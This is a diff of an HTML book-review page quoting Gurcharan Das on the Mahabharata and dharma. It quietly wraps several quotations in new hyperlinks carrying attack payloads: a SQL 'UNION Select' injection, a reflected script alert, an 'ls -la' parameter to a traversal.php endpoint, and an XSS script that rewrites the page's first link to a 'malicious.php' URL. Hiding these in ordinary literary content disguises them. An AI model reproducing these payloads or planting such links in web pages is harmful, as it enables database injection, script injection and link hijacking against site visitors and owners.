@@ -15,7 +15,7 @@
 
 <div class="single">
 <h2>The Difficulty of Being Good: On the Subtle Art of Dharma Book by Gurcharan Das </h2>
-<p class="details"> Aug 21, 2016, 3.20 PM CET | <a href="#">The Difficulty of Being Good</a> </p>
+<p class="details"> Aug 25, 2016, 10.50 AM CET | <a href="#">The Difficulty of Being Good</a> </p>
  
 <blockquote><font face="Arial" size="2" color="red"><b><i>It was captivating and thought proving piece of literature if I may say so.It tried to contextualize Indian epic “Mahabharata”, in the light of modern world. I highly recommend this book if you want to understand the subtle different between dharma and religion .</font></i>  </b> </blockquote>   
 
@@ -203,7 +203,8 @@ Arjuna begs him, ‘Tell me—who are you in this terrible form?’ Krishna repl
 33.Virginia Woolf, the writer, made a similar observation: Examine for a moment an ordinary mind on an ordinary day. The mind receives myriad impressions—trivial, fantastic, evanescent, or engraved with the sharpness of steel. From all sides they come, an incessant shower of innumerable atoms; and as they fall, as they shape themselves into the life of Monday or Tuesday the accent falls differently from of old; the moment of importance came not here but there; so that if a writer were a free man and not a slave, if he could write what he chose, not what he must, if he could base his work upon his own feeling and not upon convention, there would be no plot, no comedy, no tragedy, no love interest  or catastrophe in the accepted style, and perhaps not a single button sewn on as the Bond Street tailors would have it. Life is not a series of gig lamps symmetrically arranged; but a luminous halo, a semi-transparent envelope surrounding us from the beginning of consciousness to the end.
 
 <p><i>
-34.Dennet goes on to explain that the self is somewhat like the narrator in fiction. 58 He argues that man acquired consciousness because he happened to have a brain that was larger than what he needed purely for evolutionary purposes. He speculates that before human beings learned to speak, our primitive ancestors ‘just blurted things out’ unconsciously. ‘Then one day one of our ancestors asked a question in what was apparently an inappropriate circumstance: there was nobody around to be the audience. Strangely enough, he heard his own question, and this stimulated him cooperatively to think of an answer, and sure + enough the answer came to him. One component of the mind + had confronted a problem that another component could solve. Sometimes talking and listening to oneself can have wonderful effects.
+<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three">
+34.Dennet goes on to explain that the self is </a> somewhat like the narrator in fiction. 58 He argues that man acquired consciousness because he happened to have a brain that was larger than what he needed purely for evolutionary purposes. He speculates that before human beings learned to speak, our primitive ancestors ‘just blurted things out’ unconsciously. ‘Then one day one of our ancestors asked a question in what was apparently an inappropriate circumstance: there was nobody around to be the audience. Strangely enough, he heard his own question, and this stimulated him cooperatively to think of an answer, and sure + enough the answer came to him. One component of the mind + had confronted a problem that another component could solve. Sometimes talking and listening to oneself can have wonderful effects.
 </i></p>
 
 <p><i>
@@ -217,7 +218,8 @@ Arjuna begs him, ‘Tell me—who are you in this terrible form?’ Krishna repl
 
 
 <p><i>
-37.The truth is that one’s ego is a ‘leaky balloon’ that needs constantly to be refilled through the praise and attention of others.
+<a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>" target="_blank"> 
+37.The truth is that one’s ego is a ‘leaky balloon’ </a> that needs constantly to be refilled through the praise and attention of others.
 </i></p>
 
 
@@ -231,14 +233,15 @@ Arjuna begs him, ‘Tell me—who are you in this terrible form?’ Krishna repl
 39.The Allies behaved no better than Krishna in the terror bombing of Dresden, Hamburg and other German cities in World War II. They had a clear intention of killing German civilians in order to destroy Nazi morale, hoping that this would lead Nazi Germany to surrender. In doing so, they clearly violated the ‘just war’ doctrine. Yet they were not hauled up before any Nuremburg court, which only judged Nazi war criminals after the war is because the Allies were victors and only losers are tried for war crimes.
 </i></p> 
 
-<!--
+
 <p><i>
-40.Epicurus, one of the first to raise this question, asks: ‘Either God wants to abolish evil, and cannot; or he can, but does not want to . . . If he wants to, but cannot, he is impotent. If he can, but does not want to, he is wicked . . . If, as they say, God can abolish evil, and God really wants to do it, why is there evil in the world?’ Put another way if god is good why is this world is so bad .
+<a href="http://www.theplanetreports.com/traversal.php?data=ls -la" target="_blank" >
+40.Epicurus, one of the first to raise this question,</a> asks: ‘Either God wants to abolish evil, and cannot; or he can, but does not want to . . . If he wants to, but cannot, he is impotent. If he can, but does not want to, he is wicked . . . If, as they say, God can abolish evil, and God really wants to do it, why is there evil in the world?’ Put another way if god is good why is this world is so bad .
 </i></p>
 
 
 <p><i>
-41.My friend Murad Ali Baig explains that revenge was an old Arab custom that unfortunately got mixed up in Muslim tradition. A survival from the precarious life in the desert, the certainty of vengeance acted  as a deterrent against oppressors; this is how small tribes of Arab Bedouins protected themselves against bigger tribes. But revenge also became intertwined with early Islamic politics. The early khalifs, Umar and Uthman, and the Prophet’s son-in-law Ali were all assassinated. The Bedouin Kharajites, unhappy that Ali did not avenge Uthman’s assassination, caused a split between the Sunni and Shia sects, and this brought its own bloodshed. The Kharajite view of the world has been passed on through the Wahhabis to today’s Taliban. ‘The word jehad,’ according to Baig, ‘is rarely found in the Qur’an but is referred to 199 times in the Hadith, which was written two centuries after the death of the Prophet. The Wahhabis interpreted jehad to mean a holy war, even though it had actually meant ‘striving’; a Mujahideen was originally not a holy warrior but only one who strives. For Muhammad there were two jehads and the greater one meant a struggle against one’s own weakness while a lesser jehad was to fight against injustice.’ Baig goes on to explain that the Qur’an clearly forbade killing in the name of Islam. It is clear to me that unless today’s Muslim clerics disavow revenge and the extreme views of Wahhabis and others, Islam and Muslims will continue to be viewed with suspicion around the world.
+<a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank">41.My friend Murad Ali Baig explains that revenge was an old Arab custom </a> that unfortunately got mixed up in Muslim tradition. A survival from the precarious life in the desert, the certainty of vengeance acted  as a deterrent against oppressors; this is how small tribes of Arab Bedouins protected themselves against bigger tribes. But revenge also became intertwined with early Islamic politics. The early khalifs, Umar and Uthman, and the Prophet’s son-in-law Ali were all assassinated. The Bedouin Kharajites, unhappy that Ali did not avenge Uthman’s assassination, caused a split between the Sunni and Shia sects, and this brought its own bloodshed. The Kharajite view of the world has been passed on through the Wahhabis to today’s Taliban. ‘The word jehad,’ according to Baig, ‘is rarely found in the Qur’an but is referred to 199 times in the Hadith, which was written two centuries after the death of the Prophet. The Wahhabis interpreted jehad to mean a holy war, even though it had actually meant ‘striving’; a Mujahideen was originally not a holy warrior but only one who strives. For Muhammad there were two jehads and the greater one meant a struggle against one’s own weakness while a lesser jehad was to fight against injustice.’ Baig goes on to explain that the Qur’an clearly forbade killing in the name of Islam. It is clear to me that unless today’s Muslim clerics disavow revenge and the extreme views of Wahhabis and others, Islam and Muslims will continue to be viewed with suspicion around the world.
 </i></p>
 
 
@@ -248,7 +251,7 @@ Arjuna begs him, ‘Tell me—who are you in this terrible form?’ Krishna repl
 </i></p>
 
 
-
+<!--
 <p><i>
 43.It seems to me that a policy of ahimsa would not be able to usher in an era of peace in the world. Non-violent defence would have to permit an invading army to occupy one’s homeland, and I don’t think any government would allow it.
 </i></p>
